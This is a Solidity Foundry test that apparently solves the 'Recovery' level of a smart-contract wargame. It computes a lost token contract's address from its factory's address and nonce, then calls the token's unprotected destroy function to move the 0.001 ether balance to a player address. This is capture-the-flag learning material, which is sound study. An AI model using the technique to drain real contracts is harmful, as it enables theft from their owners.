// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel17.sol";

contract Attacker is Test {
    Recovery factory = Recovery(0xC597c6cBa69b30FaFD7D7B664D4594c477EeF51F);
    address payable player = payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);

    function test() external {
        address payable tokenAddress = payable(
            address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), factory, bytes1(0x01))))))
        );

        assertEq(tokenAddress.balance, 0.001 ether);

        SimpleToken(tokenAddress).destroy(player);

        assertEq(tokenAddress.balance, 0);
    }
}
